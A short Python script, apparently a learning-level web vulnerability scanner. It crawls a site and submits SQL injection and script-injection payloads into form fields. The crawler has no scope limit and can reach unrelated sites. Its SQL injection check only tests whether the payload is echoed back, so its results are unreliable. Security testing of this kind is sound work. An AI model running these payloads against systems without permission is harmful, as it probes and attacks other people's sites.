import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

# Basic payloads for testing vulnerabilities
SQL_PAYLOADS = ["' OR 1=1 --", "' OR 'a'='a"]
XSS_PAYLOADS = ["<script>alert('XSS')</script>", "\"><script>alert('XSS')</script>"]

visited_links = set()

def get_forms(url):
    """Extract all form elements from a webpage"""
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        forms = soup.find_all("form")
        return forms
    except requests.exceptions.RequestException:
        return []

def form_details(form):
    """Extract useful information from form"""
    details = {}
    action = form.attrs.get("action", "").lower()
    method = form.attrs.get("method", "get").lower()
    inputs = []
    for input_tag in form.find_all("input"):
        input_type = input_tag.attrs.get("type", "text")
        input_name = input_tag.attrs.get("name")
        inputs.append({"type": input_type, "name": input_name})
    details["action"] = action
    details["method"] = method
    details["inputs"] = inputs
    return details

def submit_form(form_details, url, payload):
    """Submit a form with a payload"""
    target_url = urljoin(url, form_details["action"])
    data = {}
    for input_tag in form_details["inputs"]:
        if input_tag["type"] == "text" or input_tag["type"] == "search":
            data[input_tag["name"]] = payload
        else:
            data[input_tag["name"]] = "test"

    if form_details["method"] == "post":
        return requests.post(target_url, data=data)
    else:
        return requests.get(target_url, params=data)

def is_vulnerable(response, payload):
    """Check if the payload appears in the response (basic check)"""
    return payload.lower() in response.text.lower()

def crawl(url, max_depth=2):
    """Recursively crawl website for links"""
    if url in visited_links or max_depth == 0:
        return
    visited_links.add(url)
    
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.content, "html.parser")
        
        for link in soup.find_all("a", href=True):
            new_url = urljoin(url, link["href"])
            if new_url.startswith("http"):
                crawl(new_url, max_depth - 1)
    except:
        pass

def scan_sql_xss(url):
    print(f"\n[+] Scanning URL: {url}")
    forms = get_forms(url)
    print(f"    Found {len(forms)} form(s)")

    for form in forms:
        details = form_details(form)

        # Test for SQL Injection
        for payload in SQL_PAYLOADS:
            response = submit_form(details, url, payload)
            if is_vulnerable(response, payload):
                print(f"    [!] SQL Injection vulnerability detected with payload: {payload}")

        # Test for XSS
        for payload in XSS_PAYLOADS:
            response = submit_form(details, url, payload)
            if is_vulnerable(response, payload):
                print(f"    [!] XSS vulnerability detected with payload: {payload}")

if __name__ == "__main__":
    target_url = input("Enter target website URL (e.g., http://testphp.vulnweb.com): ").strip()
    print("\nStarting Vulnerability Scan...\n")
    crawl(target_url)
    for link in visited_links:
        scan_sql_xss(link)
    print("\nScan completed!")
